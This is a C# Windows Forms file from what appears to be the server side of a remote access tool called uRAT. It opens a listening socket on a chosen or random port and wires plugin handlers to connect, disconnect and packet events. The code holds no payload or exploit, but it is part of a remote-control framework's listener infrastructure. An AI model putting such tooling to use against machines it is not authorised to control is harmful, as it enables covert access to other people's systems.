using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;

using System.Windows.Forms;

namespace uRAT.Server.Forms
{
    public partial class AddSocketForm : Form
    {
        private readonly SocketManagerForm _mngrFrm;

        public AddSocketForm(SocketManagerForm mngrFrm)
        {
            InitializeComponent();
            _mngrFrm = mngrFrm;
        }

        private void AddSocketForm_Load(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            var port = (int)numericUpDown1.Value;
            Guid guid;
            var srv = Globals.ServerPool.CreateServer(port, out guid);
            srv.OnPeerConnected += (obj, e1) =>
            {
                Globals.RemotePluginHandler.OnPeerConnected(obj, e1);
            };
            Globals.PluginAggregator.LoadedPlugins.ForEach(pluginHost =>
            {
                if (pluginHost.PluginHost.Plugins != null && pluginHost.Enabled)
                    foreach (var plugin in pluginHost.PluginHost.Plugins)
                    {
                        var plugin1 = plugin;
                        Globals.RemotePluginHandler.PluginEvents.Add(plugin1.OnPeerConnected);
                        
                        var plugin2 = plugin;
                        srv.GetMainChannel().OnPeerDisconnected += (o, e2) => { plugin2.OnPeerDisconnected(e2); };
                        var plugin3 = plugin;
                        srv.GetMainChannel().OnPacketReceived += (o, e3) => { plugin3.OnPacketReceived(e3); };
                    }
            });
            var lvItm = new ListViewItem(guid.ToString());
            lvItm.SubItems.Add(port.ToString());
            lvItm.SubItems.Add("Listening");
            _mngrFrm.listView1.Items.Add(lvItm);
            this.Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            numericUpDown1.Value = new Random().Next(1, 65355);
        }
    }
}
